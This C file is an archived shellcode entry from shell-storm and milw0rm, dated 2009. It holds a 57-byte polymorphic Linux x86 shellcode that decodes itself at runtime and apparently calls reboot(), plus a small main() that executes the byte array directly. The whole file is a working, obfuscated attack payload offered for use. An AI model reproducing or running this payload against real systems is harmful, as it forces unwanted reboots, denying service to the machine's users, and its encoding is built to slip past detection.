/*
 *  Title :	reboot() polymorphic shellcode - 57 bytes
 *  Os: 	Linux x86
 *
 *  Author: 	Jonathan Salwan - submit AT shell-storm.org
 *  Web: 	http://www.shell-storm.org
 *
 *
 *  !! Database of shellcodes => http://www.shell-storm.org/shellcode/
 *
 */

#include <stdio.h>

char shellcode[] = 	"\xeb\x11\x5e\x31\xc9\xb1\x30\x80"
			"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
  			"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
			"\x32\xc1\x51\x69\x63\x70\x70\x75"
			"\x69\x6f\x30\x73\x66\x69\x30\x74"
			"\x63\x6a\x8a\xe4\x51\x8a\xe3\x54"
			"\x8a\xe3\x54\x8a\xe2\xb1\x0c\xce"
			"\x81";


int main()
{
        fprintf(stdout,"Length: %d\n",strlen(shellcode));
        (*(void(*)()) shellcode)();

return 0;
}

// milw0rm.com [2009-06-29]